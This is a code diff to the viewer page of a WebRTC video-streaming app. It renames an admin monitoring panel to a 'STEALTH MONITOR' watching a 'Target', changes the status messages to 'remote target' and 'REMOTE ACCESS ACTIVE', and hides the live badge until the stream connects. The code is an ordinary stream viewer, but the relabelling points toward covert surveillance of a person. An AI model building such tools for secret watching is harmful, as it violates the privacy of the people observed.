@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Monitor | SecureStream</title>
+    <title>Admin Control | SecureStream</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #ef4444; --bg: #0f172a; --glass: rgba(255, 255, 255, 0.05); --border: rgba(255, 255, 255, 0.1); }
@@ -13,24 +13,24 @@
         .container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
         .monitor-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border-radius: 20px; border: 2px solid var(--primary); position: relative; overflow: hidden; box-shadow: 0 0 30px rgba(239, 68, 68, 0.2); }
         #remoteVideo { width: 100%; height: 100%; object-fit: cover; }
-        .live-indicator { position: absolute; top: 20px; left: 20px; background: var(--primary); padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 600; animation: blink 1.5s infinite; }
+        .live-indicator { position: absolute; top: 20px; left: 20px; background: var(--primary); padding: 5px 15px; border-radius: 5px; font-size: 12px; font-weight: 600; animation: blink 1.5s infinite; visibility: hidden; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .status-msg { color: #94a3b8; font-size: 14px; margin-top: 10px; }
+        .status-msg { color: #94a3b8; font-size: 14px; margin-top: 15px; background: var(--glass); padding: 10px 20px; border-radius: 10px; }
     </style>
 </head>
 <body>
 
 <header>
-    <div class="logo">Secure<span>Stream</span> <small style="color:white; font-size:12px;">| ADMIN PANEL</small></div>
-    <div>Monitoring: <span th:text="${adminName}">Admin</span></div>
+    <div class="logo">Secure<span>Stream</span> <small style="color:white; font-size:11px;">| STEALTH MONITOR</small></div>
+    <div style="font-size: 13px;">Target: <span style="color: #3b82f6;" th:text="${adminName}">Active User</span></div>
 </header>
 
 <div class="container">
     <div class="monitor-box">
-        <div class="live-indicator">REC ● LIVE</div>
+        <div id="liveBadge" class="live-indicator">LIVE FEED</div>
         <video id="remoteVideo" autoplay playsinline></video>
     </div>
-    <div class="status-msg" id="statusMsg">Waiting for User to Go Live...</div>
+    <div class="status-msg" id="statusMsg">Connecting to remote target...</div>
 </div>
 
 <script>
@@ -49,7 +49,7 @@
         socket = new WebSocket(protocol + window.location.host + "/video-stream");
 
         socket.onopen = () => {
-            document.getElementById('statusMsg').innerText = "Connected. Waiting for stream...";
+            document.getElementById('statusMsg').innerText = "Waiting for User to login...";
         };
 
         socket.onmessage = async (event) => {
@@ -67,8 +67,9 @@
         peerConnection = new RTCPeerConnection(configuration);
         peerConnection.ontrack = (event) => {
             document.getElementById('remoteVideo').srcObject = event.streams[0];
-            document.getElementById('statusMsg').innerText = "STREAMING ACTIVE";
+            document.getElementById('statusMsg').innerText = "REMOTE ACCESS ACTIVE";
             document.getElementById('statusMsg').style.color = "#22c55e";
+            document.getElementById('liveBadge').style.visibility = "visible";
         };
 
         peerConnection.onicecandidate = (event) => {
